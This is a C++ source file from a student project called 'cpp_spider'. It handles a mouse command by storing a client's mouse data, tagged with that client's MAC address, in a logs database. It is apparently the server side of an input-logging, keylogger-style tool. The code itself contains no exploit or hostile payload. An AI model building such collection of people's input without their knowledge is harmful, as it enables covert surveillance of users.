/*
** MouseCommand.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/server/src/Spider/Commands/commands/MouseCommand.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 19:44:34 2017 Gauthier Cler
** Last update Sun Oct 08 19:44:34 2017 Gauthier Cler
*/

#include "MouseCommand.hpp"

bool Spider::Commands::MouseCommand::run(const std::string &data, Spider::Network::Client::instance client, DB::Manager &manager) {
  DB::Model mouse("mouse");

  mouse.load(data);
  mouse.add("client_mac", client->getMac());
  manager["logs"]->insert(mouse);
  return true;
}
